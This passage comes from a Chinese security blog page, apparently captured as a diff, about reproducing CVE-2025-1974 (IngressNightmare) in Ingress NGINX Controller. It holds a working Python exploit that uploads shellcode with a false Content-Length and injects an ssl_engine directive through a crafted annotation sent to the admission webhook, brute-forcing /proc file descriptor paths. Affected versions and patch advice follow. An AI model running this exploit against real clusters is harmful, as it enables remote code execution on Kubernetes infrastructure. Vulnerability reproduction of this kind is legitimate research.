class="line">def upload():</span><br><span class="line">    real_lenth = len(shellcode)</span><br><span class="line">    fake_lenth = real_lenth + 20</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Content-length&quot;: str(fake_lenth),</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/octet-stream&quot;,</span><br><span class="line">            &quot;Connection&quot;: &quot;keep-alive&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, headers=headers,data= shellcode)</span><br><span class="line">        print(&quot;[+]upload success&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;[!]upload failed\n&quot;)</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def testing_to_load():</span><br><span class="line">    for pid in range(0,41):</span><br><span class="line">        for fd in range(0,41):</span><br><span class="line">            path_test = f&#x27;/proc/&#123;pid&#125;/fd/&#123;fd&#125;&#x27;</span><br><span class="line">            data[&quot;request&quot;][&quot;object&quot;][&quot;metadata&quot;][&quot;annotations&quot;][</span><br><span class="line">                &quot;nginx.ingress.kubernetes.io /&quot;</span><br><span class="line">            ] = &quot;http://example.com/#;&#125;&#125;&#125;\\n\\nssl_engine %s;\\n\\n&quot; % (path_test,)</span><br><span class="line"></span><br><span class="line">            try:</span><br><span class="line">                res = requests.post(admission_url, json=data, verify=False)</span><br><span class="line">                print(&quot;[+]testing&quot; + &quot; &quot; + path_test)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;[!]&quot; + &quot; error parsing response&quot;)</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line">upload()</span><br><span class="line">testing_to_load()</span><br></pre></td></tr></table></figure>
+
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Ingress NGINX Controller 版本&lt; 1.12.1</p>
+<p>Ingress NGINX Controller 版本&lt; 1.11.5</p>
+<p>Ingress NGINX Controller 版本&lt; 1.10.7</p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>这些漏洞已在 Ingress NGINX Controller 的 1.12.1、1.11.5 和 1.10.7 版本中得到修复。建议用户尽快更新到最新版本，并确保准入 Webhook 端点不会对外暴露</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/link/">link</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2025-1974%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">CVE-2025-1974复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">进一步利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.6.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&text=IngressNightmare漏洞集群复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&is_video=false&description=IngressNightmare漏洞集群复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=IngressNightmare漏洞集群复现&body=Check out this article: http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&title=IngressNightmare漏洞集群复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&name=IngressNightmare漏洞集群复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/27/IngressNightmare%E5%A4%8D%E7%8E%B0/&t=IngressNightmare漏洞集群复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    Xsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
